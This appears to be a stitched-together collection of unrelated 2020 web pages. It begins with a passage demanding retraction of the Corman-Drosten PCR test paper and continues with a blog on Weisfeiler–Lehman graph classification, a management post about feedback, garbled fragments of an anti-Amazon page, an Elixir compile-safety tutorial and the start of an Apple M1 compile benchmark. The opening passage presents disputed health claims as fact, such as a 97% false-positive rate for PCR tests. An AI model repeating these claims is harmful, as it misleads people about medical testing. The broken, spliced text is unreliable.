<div><p>The published RT-qPCR protocol for detection and diagnostics of 2019-nCoV and the manuscript suffer from numerous technical and scientific errors, including insufficient primer design, a problematic and insufficient RT-qPCR protocol, and the absence of an accurate test validation. Neither the presented test nor the manuscript itself fulfils the requirements for an acceptable scientific publication. Further, serious conflicts of interest of the authors are not mentioned. Finally, the very short timescale between submission and acceptance of the publication (24 hours) signifies that a systematic peer review process was either not performed here, or of problematic poor quality.&nbsp;&nbsp;We provide compelling evidence of several scientific inadequacies, errors and flaws. </p><p>Considering the scientific and methodological blemishes presented here, we are confident that the editorial board of Eurosurveillance has no other choice but to retract the publication.</p></div>







<h2><strong>CONCISE REVIEW REPORT</strong></h2>



<div><p>This paper will show numerous serious flaws in the Corman-Drosten paper, the significance of which has led to worldwide misdiagnosis of infections attributed to SARS-CoV-2 and associated with the disease COVID-19. We are confronted with stringent lockdowns which have destroyed many people’s lives and livelihoods, limited access to education and these imposed restrictions by governments around the world are a direct attack on people’s basic rights and their personal freedoms, resulting in collateral damage for entire economies on a global scale.</p><p><strong>There are ten fatal problems with the Corman-Drosten paper which we will outline and explain in greater detail in the following sections.</strong></p></div>



<p>The first and major issue is that the novel Coronavirus SARS-CoV-2 (in the publication named 2019-nCoV and in February 2020 named SARS-CoV-2 by an international consortium of virus experts) is based on in silico (theoretical) sequences, supplied by a laboratory in China [1], because at the time neither control material of infectious (“live”) or inactivated SARS-CoV-2 nor isolated genomic RNA of the virus was available to the authors. To date no validation has been performed by the authorship based on isolated SARS-CoV-2 viruses or full length RNA thereof. According to Corman et al.:</p>



<blockquote><p><strong><em>“We aimed to develop and deploy robust diagnostic methodology for use in public health laboratory settings without having virus material available.”</em> [1]</strong></p></blockquote>



<p>The focus here should be placed upon the two stated aims: a) <em>development</em> and b) <em>deployment of a diagnostic test for use in public health laboratory settings</em>. These aims are not achievable without having any actual virus material available (e.g. for determining the infectious viral load). In any case, only a protocol with maximal accuracy can be the mandatory and primary goal in any scenario-outcome of this magnitude. Critical viral load determination is mandatory information, and it is in Christian Drosten’s group responsibility to perform these experiments and provide the crucial data.</p>



<div><p>Nevertheless these in silico sequences were used to develop a RT-PCR test methodology to identify the aforesaid virus. This model was based on the assumption that the novel virus is very similar to SARS-CoV from 2003 as both are beta-coronaviruses.</p><p>The PCR test was therefore designed using the genomic sequence of SARS-CoV as a control material for the Sarbeco component; we know this from our personal email-communication with [2] one of the co-authors of the Corman-Drosten paper. This method to model SARS-CoV-2 was described in the Corman-Drosten paper as follows:</p></div>



<blockquote><p><em>“<strong>the establishment and validation of a diagnostic workflow for 2019-nCoV</strong> <strong>screening and specific confirmation, designed in absence of available virus isolates or original patient specimens. Design and validation were enabled by the close genetic relatedness to the 2003 SARS-CoV, and aided by the use of synthetic nucleic acid technology.”</strong></em></p></blockquote>



<p>The Reverse Transcription-Polymerase Chain Reaction (RT-PCR) is an important biomolecular technology to rapidly detect rare RNA fragments, which are known in advance. In the first step, RNA molecules present in the sample are reverse transcribed to yield cDNA. The cDNA is then amplified in the polymerase chain reaction using a specific primer pair and a thermostable DNA polymerase enzyme. The technology is highly sensitive and its detection limit is theoretically 1 molecule of cDNA. The specificity of the PCR is highly influenced by biomolecular design errors.</p>



<h3><strong>What is important when designing an RT-PCR Test and the quantitative RT-qPCR test described in the Corman-Drosten publication?</strong></h3>



<h5><strong>1. The primers and probes:</strong></h5>



<p>a) the concentration of primers and probes must be of optimal range <br>(100-200 nM)<br>b) must be specific to the target-gene you want to amplify<br>c) must have an optimal percentage of GC content relative to the total nitrogenous bases (minimum 40%, maximum 60%)<br>d) for virus diagnostics at least 3 primer pairs must detect 3 viral genes (preferably as far apart as possible in the viral genome)</p>



<h5><strong>2. The temperature at which all reactions take place:</strong></h5>



<p>a) DNA melting temperature (&gt;92°)<br>b) DNA amplification temperature (TaqPol specific)<br>c) Tm; the annealing temperature (the temperature at which the primers and probes reach the target binding/detachment, not to exceed 2 ̊C per primer pair). Tm heavily depends on GC content of the primers</p>



<h5><strong>3. The number of amplification cycles (less than 35; preferably 25-30 cycles);</strong></h5>



<p>In case of virus detection, &gt;35 cycles only detects signals which do not correlate with infectious virus as determined by isolation in cell culture [reviewed in 2]; if someone is tested by PCR as positive when a threshold of 35 cycles or higher is used (as is the case in most laboratories in Europe &amp; the US), the probability that said person is actually infected is less than 3%, the probability that said result is a false positive is 97% [reviewed in 3]</p>



<h5><strong>4. Molecular biological validations; amplified PCR products must be validated either by running the products in a gel with a DNA ruler, or by direct DNA sequencing</strong></h5>



<h5><strong>5. Positive and negative controls should be specified to confirm/refute specific virus detection</strong></h5>



<h5><strong>6. There should be a Standard Operational Procedure (SOP) available</strong></h5>



<p>SOP unequivocally specifies the above parameters, so that all laboratories are able to set up the exact same test conditions. To have a validated universal SOP is essential, because it enables the comparison of data within and between countries.</p>



<h3><strong>MINOR CONCERNS WITH THE CORMAN-DROSTEN PAPER</strong></h3>



<p>1. In Table 1 of the Corman-Drosten paper, different abbreviations are stated – “nM” is specified, “nm” isn’t. Further in regards to correct nomenclature, nm means “nanometer” therefore nm should read nM here.</p>



<p>2. It is the general consensus to write genetic sequences always in the 5’-3’ direction, including the reverse primers. It is highly unusual to do alignment with reverse complementary writing of the primer sequence as the authors did in figure 2 of the Corman-Drosten paper. Here, in addition, a wobble base is marked as “y” without description of the bases the Y stands for.</p>



<p>3. Two misleading pitfalls in the Corman-Drosten paper are that their Table 1 does not include Tm-values (annealing-temperature values), neither does it show GC-values (number of G and C in the sequences as %-value of total bases).</p>



<h3><strong>MAJOR CONCERNS WITH THE CORMAN-DROSTEN PAPER</strong></h3>



<h4>A) BACKGROUND</h4>



<div><p>The authors introduce the background for their scientific work as: “The ongoing outbreak of the recently emerged novel coronavirus (2019-nCoV) poses a challenge for public health laboratories as virus isolates are unavailable while there is growing evidence that the outbreak is more widespread than initially thought, and international spread through travelers does already occur”.</p><p>According to BBC News [4] and Google Statistics [5] there were 6 deaths world-wide on January 21st 2020 – the day when the manuscript was submitted. Why did the authors assume a challenge for public health laboratories while there was no substantial …</p></div></article></div>

December 1, 2020 | https://bastian.rieck.me/blog/posts/2020/topology_graphs/ | <a href="https://web.archive.org/web/*/https://bastian.rieck.me/blog/posts/2020/topology_graphs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>I have written at lengths about certain aspects of topological data
analysis, but I have neglected to discuss one of its main applications,
i.e. the classification of graphs. In this post, I will therefore take
you on a quick tour of our ICML paper <a href="http://proceedings.mlr.press/v97/rieck19a/rieck19a.pdf">A Persistent Weisfeiler–Lehman Procedure for Graph Classification</a>.</p>
<p>Let us assume that we are given a graph with node label information. The
graph could, for instance, be a molecule, whose nodes are atoms such as
carbon or oxygen, and whose edges indicate chemical bonds. The goal
could now be to classify a given molecule into a set of classes, such as
‘toxic’, ‘carcinogen’, etc. How can we achieve such a classification?
One of the simplest techniques dates back to the 1960s and involves
calculating an <em>iterative fingerprint</em> of the graph! This procedure was
suggested by <a href="https://en.wikipedia.org/wiki/Boris_Weisfeiler">Boris Weisfeiler</a>
and Andrei Lehman&nbsp;(sometimes also transliterated as ‘Leman’) in
their seminal article <a href="https://www.iti.zcu.cz/wl2018/pdf/wl_paper_translation.pdf">The reduction of a graph to canonical form and the
algebra which appears therein</a>.</p>
<p>At its core, the algorithm is an iteration scheme that works like this:</p>
<ol>
<li>For a node $v$, collect its label and the labels of adjacent nodes in
a multiset.</li>
<li>Assign this multiset a new label by hashing it—with the proviso
that the hashing function is <a href="https://en.wikipedia.org/wiki/Perfect_hash_function"><em>perfect</em></a>, i.e.
it maps distinct labels to distinct values with no collisions.</li>
<li>Replace all node labels by their multiset hashes.</li>
</ol>
<p>Intuitively, each step of the algorithm accumulates more information
from nodes that are further removed from the current node. The hashed
multiset label is thus an expression of the neighbourhood around
a node—and after a sufficiently large number of iterations, the
hashed labels will not change any more.</p>
<p>For example, suppose you are dealing with this simple graph&nbsp;(to
prevent confusion of node labels and node IDs, I used <em>colours</em> to
indicate node labels in this example):</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_graph.svg" alt="Weisfeiler--Lehman example graph" height="128"> 
</figure>

</div>
<p>Tabulating the neighbourhood of each node then results in the following
table:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_table_1.svg" alt="Weisfeiler--Lehman multiset example (before hashing)" height="128"> 
</figure>

</div>
<p>Now for the hashing step. In this example, <em>perfect hashing</em> means
choosing a set of colours that is distinct for every distinct
combination of neighbourhood labels and vertex labels:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_table_2.svg" alt="Weisfeiler--Lehman multiset example (after hashing)" height="128"> 
</figure>

</div>
<p>Notice how nodes A, B, and G are hashed to the same colour—because
in the first iteration of the algorithm, they cannot be distinguished.
How can we use the information about the hashed labels in a subsequent
comparison task? The answer is lies in <em>counting</em> them in a histogram
vector, which is indexed by the unique labels—this is where our
requirement of the perfect hashing function is helpful. For the
previously-shown graph, it looks like this:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/weisfeiler_lehman_feature_vector.svg" alt="Weisfeiler--Lehman subtree feature vector" height="128"> 
</figure>

</div>
<p>The <em>fingerprint</em> of this graph, according to the first iteration of the
Weisfeiler–Lehman scheme is therefore $(3, 1, 2, 1)$. Further iterations
just make the feature vector longer&nbsp;(technically, the initial
labels already give rise to a feature vector of counts). This procedure
can now be repeated for higher-order iterations and the resulting
feature vectors can be compared across graphs by evaluating, for
example, their dot product. More formalisations of this idea have
resulted in the very successful <a href="https://www.jmlr.org/papers/volume12/shervashidze11a/shervashidze11a.pdf">Weisfeiler–Lehman Graph
Kernels</a>
publication. This method arguably constitutes the basis for graph neural
networks—in fact, these networks can be seen as a parametrised
version of the Weisfeiler–Lehman iteration scheme. But I digress—if
you are interested in these aspects, please read <a href="https://towardsdatascience.com/beyond-weisfeiler-lehman-approximate-isomorphisms-and-metric-embeddings-f7b816b75751">Michael Bronstein’s
article on going beyond graph
isomorphism</a>
for more details.</p>
<p>Now, despite its great practical utility, this feature vector is lacking
some <em>structural</em> information about the graph. It does not know whether
a certain label contributes much to the topological structure of
a graph—such as a ring of carbon atoms would in molecule—or not. To
this end, we introduced a notion of topological relevance for each node
label! Briefly put, we first developed a distance metric that would
permit us turn any <em>labelled</em> graph into a <em>weighted</em> graph. We then
calculate a persistence barcode, a topological descriptor of the graph.
This descriptor assesses the relevance of a topological feature created
by some node label. We use the topological relevance of each feature as
an additional <em>weight</em> for the previously-shown feature vector. In
essence, labels that contribute a large amount of topological structure
in a graph are assigned a higher weight than labels that only contribute
a meagre amount!</p>
<p>Here is a graphical depiction of our process:</p>
<div>
<figure>
    <img src="https://bastian.rieck.me/images/p_wl_pipeline.svg" alt="Persistent Weisfeiler--Lehman pipeline" height="128"> 
</figure>

</div>
<p>If you want to brush up your understanding of the barcode calculation,
head on over to <a href="https://christian.bock.ml/">Christian’s website</a>; he has
an <a href="https://christian.bock.ml/posts/persistent_homology">excellent article on persistent
homology</a>.</p>
<p>The neat thing about our approach is that we can easily integrate
information about <em>cycles</em> into the feature vector—this is
a functionality that the original Weisfeiler–Lehman Graph Kernels
Framework lacks. Moreover, these cycles turn out to be crucial in
improving classification performance—we get an increase of more than
3% in classification accuracy by considering them in some data sets!</p>
<p>If this has whet your appetite, I invite you to <a href="http://proceedings.mlr.press/v97/rieck19a/rieck19a.pdf">read our
paper</a> or <a href="https://github.com/BorgwardtLab/P-WL">take
a look at the code</a>. If you want
to learn more about graph classification using graph kernels, take
a look at our <a href="https://arxiv.org/abs/2011.03854">recent survey on graph kernels</a>,
which will hopefully be officially announced in time for NeurIPS 2020.
In the best tradition of Fermat, I would very much like to cover the
content of the survey here, but this blog is too small to contain all of
it—maybe for a subsequent post?</p>
<p>Until next time!</p>

<p>The writing is on the wall for Susan, and it has been for months. She’s struggling to get her work done. She’s <a href="https://critter.blog/2020/10/28/the-all-powerful-bad-apple/">grumpy most of the time</a>. Nobody likes working with her. </p>



<p>You’ve tried your best with her. You really have. You’ve <a href="https://critter.blog/2020/11/26/5-second-feedback/">given her feedback</a> and <a href="https://critter.blog/2020/11/11/good-feedback-is-pokey/">more feedback</a> and some <a href="https://critter.blog/2020/11/27/future-focused-feedback/">more feedback</a>. But when you run out of options and you have to let her go, she’s somehow surprised. The heck?!</p>



<p>You underestimated her ability to not hear you. She listened to the words but didn’t comprehend the seriousness. She got the message but she didn’t get the <em>message</em>.</p>



<p>I’ve learned this lesson over and over, and it hurts every time. People have an endless capacity to not really hear me. And this <a href="https://critter.blog/2020/08/26/extreme-ownership-book-notes/">isn’t their fault, it’s mine</a>. I need to tell them better, and more often. </p>



<p>Anytime I’m asking someone to do anything, especially if I’m <a href="https://critter.blog/2020/09/25/if-you-want-to-be-heard-listen/">asking them to change</a>, I should <em>assume</em> that they won’t hear me like I want them to. And the human urge to be polite compounds the problem. If they can’t hear me when I think I’m being clear as day, I’m even more screwed if I’m sticking to <a href="https://critter.blog/2020/09/07/if-you-want-to-help-dont-pretend-its-for-your-sake/">hinting or nudging</a>.</p>



<p>Ever heard of <a href="https://en.wikipedia.org/wiki/Hanlon%27s_razor">Hanlon’s razor</a>, which says “never attribute to malice what can be explained by incompetence”? How about this:</p>



<figure><blockquote><p>Never attribute to apathy that which can be adequately explained by deafness.</p><cite>Critter’s razor</cite></blockquote></figure>



<p>With job performance, we “solve” this with PIPs (performance improvement plans) and annual performance reviews with a grading system. They convey that <a href="https://critter.blog/2020/11/24/intense-intervention-or-acceptance-pick-one/">someone is in trouble</a> in a way that is harder for them to not hear. </p>



<p>But it’s not only a job performance issue, it’s a human nature issue. I must always be twice as clear as seems necessary when I’m giving feedback. <a href="https://critter.blog/2020/08/13/clear-is-kind-unclear-is-unkind/">Clear is kind and unclear is unkind</a>, and if I’m not being heard then I’m not being clear.</p>

	      the market.
	    </p>
	    <p>
	      We should not allow a company to have a share over around
	      10% of any market.  If in a certain field a single dominant
	      company is beneficial for society, that means it is a
	      natural monopoly, and should be served by a regulated
	      utility.

	      Amazon offered a "30-day free trial", and <a href="https://www.theguardian.com/media/2015/mar/04/amazon-prime-free-trial-offer-banned-for-misleading-over-fees">started paid subscriptions
		automatically</a> at the end of it.
	    </p>
	    <p>
	      This is clearly an attempt to trick customers — wrong in all cases

	    <p>
	      Amazon's persistent blindness to certain fraudulent sales

	      makes it
	      <a href="https://petapixel.com/2017/08/11/fell-victim-1500-used-camera-lens-scam-amazon/">easy

              The Amazon Swindle has a back door that can erase books.  We found

		erased thousands of copies of 1984</a>.  In response to criticism,
              Amazon promised it would never do this again unless <em>ordered to by
		the state</em>, which I find not very comforting.
            </p>
            <p>
              Amazon did not keep that promise.  In 2012 it <a href="http://boingboing.net/2012/10/22/kindle-user-claims-amazon-dele.html">wiped

	      Amazon threatens to cut off customers if they return things more than

	      The strange irony of the article is that it is totally defeatist.  It
	      shows why we need to defeat Amazon, but assumes that that is

	      and then refuses to believe people could ever refuse.

	      I have never bought anything from Amazon.  And I never will.  Amazon

That will enable them to listen to whoever the device's "owner" comes near.
	    <p>
	      But don't worry — Amazon is learning how to talk the talk about privacy in a way that more people would find comforting.
	    </p><p>
	      A voice command system that is safe for its owner would be one that runs only free software, and does the whole job locally, communicating with other sites only when asked to.  With the software inside free, the owner of this device would truly own it.

December 1, 2020 | https://www.stackbuilders.com/news/brewing-a-safer-elixir | <a href="https://web.archive.org/web/*/https://www.stackbuilders.com/news/brewing-a-safer-elixir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://elixir-lang.org/">Elixir</a> is a dynamic, functional language that works on top of the Erlang Virtual Machine. It aims for reliable, performant and scalable applications.</p>
<p>In this post, we’re going to focus on the following topics related to this language:</p>
<ul>
<li><strong>Functional programming:</strong> a programming paradigm that allows developers to create code that is short and concise by using features like guards or pattern matching.</li>
<li><strong>Dynamic typing</strong>: a characteristic of a programming language that evaluates types at runtime.</li>
</ul>
<p>If you’re wondering: <em>How is Elixir going to help me to build a reliable and scalable application when it’s a dynamic language? I could have a type error at any moment.</em> Don’t worry, we are going to solve this question. But first, we need to talk about some tools and concepts.</p>
<h2 id="mix">Mix</h2>
<p><a href="https://hexdocs.pm/mix/Mix.html">Mix</a> is Elixir’s build tool that allows us to create projects, manage dependencies, run tasks and even more. Mix can also compile your project’s dependencies and source code with the following commands:</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a><span>mix</span> deps.compile <span>&amp;&amp;</span> <span>mix</span> compile</span></code></pre></div>
<p>Now that we know how to compile our code, let’s create a small module with only one function:</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>defmodule</span> <span>MyModule</span> <span>do</span></span>
<span id="cb2-2"><a href="#cb2-2"></a>  <span>def</span> greet(pet), <span>do</span>: <span>"Hey </span><span>#{</span>pet<span>}</span><span>!"</span></span>
<span id="cb2-3"><a href="#cb2-3"></a><span>end</span></span></code></pre></div>
<p>Pretty straightforward, no compile errors and it works as expected. However on a daily basis (and after a few dozen or hundreds of lines of code) there’s always the possibility to make a typo leading our code to runtime errors.</p>
<p>Almost all (<em>if not all</em>) developers with experience in web development have run into a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors/Not_defined">reference error</a>, usually written as <strong>“yourVariable” is not defined</strong>. This is something common in dynamic languages and of course, there are ways to prevent these errors (<a href="https://www.typescriptlang.org/">TypeScript</a> instead of Vanilla JavaScript for instance).</p>
<p>Lucky for us, compiling Elixir already helps us to prevent this problem out of the box. Let’s introduce a typo in our previous example:</p>
<div id="cb3"><pre><code><span id="cb3-1"><a href="#cb3-1"></a><span>defmodule</span> <span>MyModule</span> <span>do</span></span>
<span id="cb3-2"><a href="#cb3-2"></a>  <span>def</span> greet(not_used_variable), <span>do</span>: <span>"Hey </span><span>#{</span>pet<span>}</span><span>!"</span></span>
<span id="cb3-3"><a href="#cb3-3"></a><span>end</span></span></code></pre></div>
<p>When compiling the project again, it would display the following output:</p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span>mix</span> compile</span>
<span id="cb4-2"><a href="#cb4-2"></a><span>Compiling</span> 1 file (.ex)</span>
<span id="cb4-3"><a href="#cb4-3"></a><span>warning</span>: variable <span>"pet"</span> does not exist and is being expanded to <span>"pet()"</span>, please use parentheses to remove the ambiguity or change the variable pet</span>
<span id="cb4-4"><a href="#cb4-4"></a>  <span>lib</span>/barebones.ex:<span>2</span>: MyModule.hello/1</span>
<span id="cb4-5"><a href="#cb4-5"></a></span>
<span id="cb4-6"><a href="#cb4-6"></a><span>warning</span>: variable <span>"not_used_variable"</span> is unused (if the variable is not meant to be used, prefix it with an underscore)</span>
<span id="cb4-7"><a href="#cb4-7"></a>  <span>lib</span>/barebones.ex:<span>2</span>: MyModule.hello/1</span>

<p>With these messages, we already can see some benefits from the compiler:</p>
<ul>
<li>It fails compilation when there’s a typo.</li>
<li>Warns us for unused variables thus no dead code. This can be achieved by using the <a href="https://hexdocs.pm/mix/Mix.Tasks.Compile.Elixir.html#module-command-line-options">command line option</a> <code>--warnings-as-errors</code>.</li>
</ul>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a><span>mix</span> compile --warnings-as-errors</span></code></pre></div>
<p>Or if you would like to enable that by default for a project, you can add that option under <code>elixirc_options</code> in your project’s configuration.</p>

<p>By using this option, it will make the compilation fail in case there are any warnings in your code.</p>
<h2 id="pattern-matching-and-guards">Pattern Matching and Guards</h2>
<p>Pattern matching allows us to define patterns to check how data is conformed. Furthermore, when writing functions, you can define different bodies for different patterns and as a result, writing cleaner and more readable code.</p>
<p>In Elixir, you can use pattern matching everywhere, even in function declarations. Let’s update our example with a simple match.</p>
<div id="cb7"><pre><code><span id="cb7-1"><a href="#cb7-1"></a><span>defmodule</span> <span>MyModule</span> <span>do</span></span>
<span id="cb7-2"><a href="#cb7-2"></a>  <span>def</span> greet(<span>"dog"</span>), <span>do</span>: <span>"Woof woof!"</span></span>
<span id="cb7-3"><a href="#cb7-3"></a></span>
<span id="cb7-4"><a href="#cb7-4"></a>  <span>def</span> greet(pet), <span>do</span>: <span>"Hey </span><span>#{</span>pet<span>}</span><span>, we haven't meet before!"</span></span>
<span id="cb7-5"><a href="#cb7-5"></a><span>end</span></span></code></pre></div>
<p>Now our function has two possible execution paths based on the argument it receives. But, this still has a flaw. <em>What would happen if the given argument is not a string?</em> This is better known in languages like <a href="https://www.haskell.org/">Haskell</a> as a <a href="http://wiki.haskell.org/Partial_functions">partial function</a> or in other words, a function that doesn’t take into account all of the possible execution paths that an argument may have.</p>
<p>We need to remember that Elixir is a dynamic language, and an argument can have any type during runtime. Since we don’t have type-checking during compilation, we may want to add more complex checks in our function and that’s where <a href="https://hexdocs.pm/elixir/guards.html">guards</a> come in place. Let’s add a guard to our example so it will format a message when the <code>greet</code> function receives only strings.</p>
<div id="cb8"><pre><code><span id="cb8-1"><a href="#cb8-1"></a><span>defmodule</span> <span>MyModule</span> <span>do</span></span>
<span id="cb8-2"><a href="#cb8-2"></a>  <span>def</span> greet(<span>"dog"</span>), <span>do</span>: <span>"Woof woof!"</span></span>
<span id="cb8-3"><a href="#cb8-3"></a></span>
<span id="cb8-4"><a href="#cb8-4"></a>  <span>def</span> greet(pet) <span>when</span> is_binary(pet), <span>do</span>: <span>"Hey </span><span>#{</span>pet<span>}</span><span>, we haven't meet before!"</span></span>
<span id="cb8-5"><a href="#cb8-5"></a></span>
<span id="cb8-6"><a href="#cb8-6"></a>  <span>def</span> greet(_), <span>do</span>: <span>"Oops! That's not a string"</span></span>
<span id="cb8-7"><a href="#cb8-7"></a><span>end</span></span></code></pre></div>
<p>By using the <code>when</code> keyword followed by a boolean expression, we can make sure our function only works when the resulting expression is <code>true</code>. <code>is_binary</code> is a wrapper for Erlang’s function <a href="https://erlang.org/doc/man/erlang.html#is_binary-1">is_binary</a> which returns <code>true</code> if the given argument is a string. With both things together, this means the following: <em>only execute this function when the argument is a string</em>.</p>
<p>But that’s not all, if we would like to have a more <em>extensible</em> API, we could also provide specific <em>optional</em> patterns by using <a href="https://elixir-lang.org/getting-started/keywords-and-maps.html">keywords or maps</a>. Let’s update our example accordingly.</p>
<div id="cb9"><pre><code><span id="cb9-1"><a href="#cb9-1"></a><span>defmodule</span> <span>MyModule</span> <span>do</span></span>
<span id="cb9-2"><a href="#cb9-2"></a>  <span>def</span> greet(<span>"dog"</span>), <span>do</span>: <span>"Woof woof!"</span></span>
<span id="cb9-3"><a href="#cb9-3"></a></span>
<span id="cb9-4"><a href="#cb9-4"></a>  <span>def</span> greet(pet) <span>when</span> is_binary(pet), <span>do</span>: <span>"Hey </span><span>#{</span>pet<span>}</span><span>, we haven't meet before!"</span></span>
<span id="cb9-5"><a href="#cb9-5"></a></span>
<span id="cb9-6"><a href="#cb9-6"></a>  <span>@doc</span> <span>"Match a keyword list which contains `:pet` string element"</span></span>
<span id="cb9-7"><a href="#cb9-7"></a>  <span>def</span> greet(<span>pet:</span> pet) <span>when</span> is_binary(pet), <span>do</span>: greet(pet)</span>
<span id="cb9-8"><a href="#cb9-8"></a></span>
<span id="cb9-9"><a href="#cb9-9"></a>  <span>@doc</span> <span>"Match a map which the `:pet` key"</span></span>
<span id="cb9-10"><a href="#cb9-10"></a>  <span>def</span> greet(%{<span>pet:</span> pet}) <span>when</span> is_binary(pet), <span>do</span>: greet(pet)</span>
<span id="cb9-11"><a href="#cb9-11"></a></span>
<span id="cb9-12"><a href="#cb9-12"></a>  <span>def</span> greet(_), <span>do</span>: <span>"Oops! That's not a string"</span></span>
<span id="cb9-13"><a href="#cb9-13"></a><span>end</span></span></code></pre></div>
<p>With this, our <code>greet</code> function will work properly for any given string in different data-types and it also has a fallback message in case the given argument is not valid. And <em>voilá</em>! We now have a <em>total function</em> that covers all paths and would lead to no runtime errors!</p>
<h2 id="structs">Structs</h2>
<p>Now that we have used pattern matching and guards, we probably would like to add extra safety to our function. We can do so by using Elixir’s <code>structs</code>. But first of all, let’s understand what they are, as stated from their <a href="https://elixir-lang.org/getting-started/structs.html">site</a>:</p>
<blockquote>
<p>Structs are extensions built on top of maps that provide compile-time checks and default values.</p>
</blockquote>
<p>Just what we were looking for, more <em>compile-time checks</em>! Let’s add a simple <code>Pet</code> struct to our example.</p>
<div id="cb10"><pre><code><span id="cb10-1"><a href="#cb10-1"></a><span>defmodule</span> <span>MyModule</span> <span>do</span></span>
<span id="cb10-2"><a href="#cb10-2"></a>  <span>defmodule</span> <span>Pet</span> <span>do</span></span>
<span id="cb10-3"><a href="#cb10-3"></a>    <span>defstruct</span> [<span>:kind</span>]</span>
<span id="cb10-4"><a href="#cb10-4"></a>  <span>end</span></span>
<span id="cb10-5"><a href="#cb10-5"></a></span>
<span id="cb10-6"><a href="#cb10-6"></a>  <span>def</span> greet(<span>"dog"</span>), <span>do</span>: <span>"Woof woof!"</span></span>
<span id="cb10-7"><a href="#cb10-7"></a></span>
<span id="cb10-8"><a href="#cb10-8"></a>  <span>def</span> greet(pet) <span>when</span> is_binary(pet), <span>do</span>: <span>"Hey </span><span>#{</span>pet<span>}</span><span>, we haven't meet before!"</span></span>
<span id="cb10-9"><a href="#cb10-9"></a></span>
<span id="cb10-10"><a href="#cb10-10"></a>  <span>@doc</span> <span>"Match a keyword list which contains `:pet` string element"</span></span>
<span id="cb10-11"><a href="#cb10-11"></a>  <span>def</span> greet(<span>pet:</span> pet) <span>when</span> is_binary(pet), <span>do</span>: greet(pet)</span>
<span id="cb10-12"><a href="#cb10-12"></a></span>
<span id="cb10-13"><a href="#cb10-13"></a>  <span>@doc</span> <span>"Match a map which the `:pet` key"</span></span>
<span id="cb10-14"><a href="#cb10-14"></a>  <span>def</span> greet(%{<span>pet:</span> pet}) <span>when</span> is_binary(pet), <span>do</span>: greet(pet)</span>
<span id="cb10-15"><a href="#cb10-15"></a></span>
<span id="cb10-16"><a href="#cb10-16"></a>  <span>def</span> greet(%<span>Pet</span>{<span>origin:</span> kind}) <span>when</span> is_binary(kind), <span>do</span>: greet(kind)</span>
<span id="cb10-17"><a href="#cb10-17"></a></span>
<span id="cb10-18"><a href="#cb10-18"></a>  <span>def</span> greet(_), <span>do</span>: <span>"Oops! That's not a string"</span></span>
<span id="cb10-19"><a href="#cb10-19"></a><span>end</span></span></code></pre></div>
<p>By doing those changes in our example and after compiling it, the following messages would be displayed in our console:</p>
<div id="cb11"><pre><code><span id="cb11-1"><a href="#cb11-1"></a><span>Compiling</span> 1 file (.ex)</span>
<span id="cb11-2"><a href="#cb11-2"></a></span>
<span id="cb11-3"><a href="#cb11-3"></a>== <span>Compilation</span> error in file lib/barebones.ex ==</span>
<span id="cb11-4"><a href="#cb11-4"></a><span>**</span> (CompileError) <span>lib</span>/barebones.ex:<span>14</span>: unknown key :origin for struct MyModule.Pet</span>
<span id="cb11-5"><a href="#cb11-5"></a>    <span>lib</span>/barebones.ex:<span>14</span>: (module)</span></code></pre></div>
<p>The compilation error message is really helpful. It says that we have a typo in our code while doing pattern matching in the <code>Pet</code> struct. It will work properly after renaming <code>origin</code> to <code>kind</code>.</p>
<p>Now that we have a deeper understanding of <em>pattern matching</em>, <em>guards</em> and <em>structs</em>, we have a better idea of how to prevent runtime errors in Elixir and also how to receive proper compile-time checks.</p>
<p>Pattern matching structs allows you to be more <em>expressive</em> on our <em>business objects</em> in any project. A great example of this would be the database DSL <a href="https://hexdocs.pm/ecto/Ecto.html">Ecto</a>. Under the hood, it creates structs over your database entities and that makes it easier to perform pattern matching against them.</p>
<h2 id="minor-caveats">Minor caveats</h2>
<p>Using structs in your codebase will help you get better compile-time checks, but, as always there’s a drawback. Each time we use a <code>struct</code> for pattern matching we create a <em>dependency</em> in our module thus leading to greater compilation times.</p>
<p>This is not bad on its own but it could <em>possibly</em> affect a developer’s programming cycle. Taking more time to compile then to execute code after making changes is a frequent task and in big projects, it could even take up to a few minutes to compile everything again (in the worst case scenario).</p>

<p>By using Elixir’s core features we will be able to introduce more <em>safety</em> to our code. But it’s not only about knowing and using its core features. It also means we need to change our mindset.</p>
<p>Having a technical background is the first step towards a <a href="https://tech.ebayinc.com/engineering/functional-thinking/">functional mindset</a>. After that we need to apply those concepts on a daily basis to make using them a habit, allowing us to understand their benefits like making our code declarative, re-usable and <a href="https://dev.to/anssip/why-you-should-learn-functional-programming-3h2g">more</a>. But it doesn’t mean we only have to limit ourselves with this mindset for Elixir. We can also apply these concepts to any other programming language.</p>

  <p><i>Posted on <code>01 Dec 2020</code> by <code>Boris Kolpackov</code>
  with comments on <a href="https://reddit.com/r/cpp/comments/k4l03y/compiling_cc_on_apple_m1/"><code>r/cpp/</code></a></i></p>

  <p>The release of Apple M1 CPU has sure generated a lot of interest.
  Intrigued by impressive benchmark results, we got an Apple Mini with M1 to
  test C/C++ compilation.</p>

  <p>Our go to compilation benchmark is a local (that is, without package
  repository) <a href="https://build2.org/"><code>build2</code></a> bootstrap
  which is dominated by C++ compilation (611 translation units) with some C
  (29) and linking (19) in between. Two nice properties of this benchmark is
  that it doesn't require anything other than the C++ compiler and is a <a href="https://openbenchmarking.org/test/pts/build2">part of the Phoronix
  benchmark</a> so we have a large number of CPUs to compare our results
  to.</p>

  <p>The Phoronix benchmark currently uses <code>build2</code> 0.12.0 while we
  will be using 0.13.0 (the current release) which takes about 10% longer to
  build.</p>

  <p>After setting up Mac OS and installing Command Line Tools for XCode 12.2
  we have all we need:</p>

  <pre>$ clang++ --version
Apple clang version 12.0.0 (clang-1200.0.32.27)
Target: arm64-apple-darwin20.1.0</pre>

  <p>Looking at the <code>_LIBCPP_VERSION</code> macro in
